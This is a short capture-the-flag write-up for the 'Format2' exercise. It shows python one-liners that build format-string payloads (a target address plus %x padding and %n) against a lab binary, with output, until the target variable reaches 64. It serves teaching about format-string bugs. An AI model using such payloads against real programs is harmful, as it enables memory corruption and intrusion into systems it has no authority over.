# Format2

## First Attempt
Just like format1, we line up our values in our payload by increasing/decreasing values on the stack. The address we need to overwrite is high up on the stack. My payload looks like this:<br>
```bash
python -c "print 'AAAA' + '\xe4\x96\x04\x08' + 'BBBB' + '%x.'*4 + '%n.'" | ./format2
AAABBBB200.f7f305a0.f7f69159.41414141..
target is 43 :(
```
Ok, so from the source code I know that <b>target</b> needs to be equal to 64. How about increasing the number of A's?
```bash
python -c "print 'AAAAAAAAAAAA' + '\xe4\x96\x04\x08' + 'BBBB' + '%x.'*6 + '%n.'" | ./format2
AAAAAAAAAAABBBB200.f7f3e5a0.f7f77159.41414141.41414141.41414141..
target is 69 :(
```
Seems like I went over. But if I decrease the number of characters on the stack, things will not align. So how do I add/subtract characters without placing more things onto the stack?

## Second Attempt: Blank Space
I can actually read/write blank spaces onto the stack which will not move the address I'm trying to write to. After that, it's just a matter of determing the size of the buffer
```bash
python -c "print 'AAAA' + '\xe4\x96\x04\x08' + 'BBBB' + '%x.'*3 + '%29x.' + '%n.'" | ./format2
AAABBBB200.f7f325a0.f7f6b159.                     41414141..
you have modified the target :)
```
